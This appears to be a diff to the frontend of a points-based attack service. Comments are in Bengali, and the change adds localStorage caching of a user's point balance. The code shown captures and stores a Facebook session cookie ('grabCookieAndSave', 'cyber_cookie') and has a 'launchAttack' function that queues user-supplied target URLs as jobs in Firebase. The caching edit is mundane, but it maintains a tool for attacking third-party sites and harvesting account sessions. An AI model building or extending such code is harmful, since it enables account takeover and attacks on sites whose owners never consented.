@@ -331,6 +331,18 @@
     let currentUserKey = "";
     let referrerKey = ""; 
 
+    // ═══ লোকাল স্টোরেজ ক্যাশ ফাংশন ═══
+    function getCachedPoints() {
+      return parseInt(localStorage.getItem('cached_points')) || 0;
+    }
+
+    function updateCachedPoints(newPoints) {
+      localStorage.setItem('cached_points', newPoints);
+      document.getElementById('userPoints').innerText = newPoints;
+      currentUserPoints = newPoints;
+    }
+
+    // ═══ অ্যাপ লোড হওয়া ═══
     window.onload = async function() {
       const urlParams = new URLSearchParams(window.location.search);
       const refParam = urlParams.get('ref');
@@ -343,22 +355,34 @@
 
       const savedCookie = localStorage.getItem('cyber_cookie');
       const savedKey = localStorage.getItem('cyber_key');
+      const cachedPoints = getCachedPoints();
 
+      // যদি আগে থেকে লগইন থাকে
       if (savedCookie && savedKey) {
         currentUserCookie = savedCookie;
         currentUserKey = savedKey;
+        
+        // লোকাল স্টোরেজ থেকে পয়েন্ট দেখাও (ফায়ারবেসে রিড না করেই)
+        document.getElementById('userPoints').innerText = cachedPoints;
+        currentUserPoints = cachedPoints;
+        
+        document.getElementById('loginPanel').classList.add('hidden');
+        document.getElementById('attackPanel').classList.remove('hidden');
+
+        // ফায়ারবেস থেকে ব্যাকগ্রাউন্ডে পয়েন্ট আপডেট করে নাও (রিড কমাতে)
         try {
           const userRef = ref(db, `users/${currentUserKey}`);
           const snapshot = await get(userRef);
           if (snapshot.exists()) {
-            currentUserPoints = snapshot.val().points || 0;
-            document.getElementById('userPoints').innerText = currentUserPoints;
-            document.getElementById('loginPanel').classList.add('hidden');
-            document.getElementById('attackPanel').classList.remove('hidden');
-            return;
+            let firebasePoints = snapshot.val().points || 0;
+            if (firebasePoints !== cachedPoints) {
+              updateCachedPoints(firebasePoints);
+            }
           }
         } catch (e) { console.log("Auth error:", e); }
+        return;
       }
+      
       document.getElementById('attackPanel').classList.add('hidden');
       document.getElementById('loginPanel').classList.remove('hidden');
     }
@@ -367,6 +391,7 @@
       window.location.replace("https://m.facebook.com/login");
     }
 
+    // ═══ কানেক্ট এবং পয়েন্ট সেভ ═══
     window.grabCookieAndSave = async function() {
       const status = document.getElementById('loginStatus');
       const btn = document.getElementById('btnConnect');
@@ -427,8 +452,10 @@
         currentUserPoints = points;
         localStorage.setItem('cyber_cookie', currentUserCookie);
         localStorage.setItem('cyber_key', currentUserKey);
+        
+        // ═══ লোকাল স্টোরেজে পয়েন্ট সেভ করা ═══
+        updateCachedPoints(points);
 
-        document.getElementById('userPoints').innerText = points;
         document.getElementById('loginPanel').classList.add('hidden');
         document.getElementById('attackPanel').classList.remove('hidden');
         
@@ -442,6 +469,7 @@
       }
     }
 
+    // ═══ অ্যাটাক এবং লোকাল পয়েন্ট মাইনাস ═══
     window.launchAttack = async function() {
       const url = document.getElementById('targetUrl').value.trim();
       const status = document.getElementById('status');
@@ -467,8 +495,12 @@
 
       try {
         currentUserPoints--;
+        // লোকাল স্টোরেজ ও UI আপডেট
+        updateCachedPoints(currentUserPoints);
+        
+        // ফায়ারবেসে পয়েন্ট আপডেট
         await update(ref(db, `users/${currentUserKey}`), { points: currentUserPoints });
-        document.getElementById('userPoints').innerText = currentUserPoints;
+        
         await set(push(ref(db, 'jobs')), { targetUrl: url, status: "pending", createdAt: Date.now() });
 
         status.className = "message msg-success";
@@ -502,11 +534,12 @@
       if (confirmSwitch) {
         localStorage.removeItem('cyber_cookie');
         localStorage.removeItem('cyber_key');
+        localStorage.removeItem('cached_points'); // লোকাল পয়েন্টও মুছে ফেলা
         window.location.reload(); 
       }
     }
 
-    let tapCount = 0;
+       let tapCount = 0;
     let tapTimer;
     document.getElementById('dashLogo').addEventListener('click', () => {
       tapCount++;
@@ -519,4 +552,4 @@
     });
   </script>
 </body>
-  </html>
+</html>
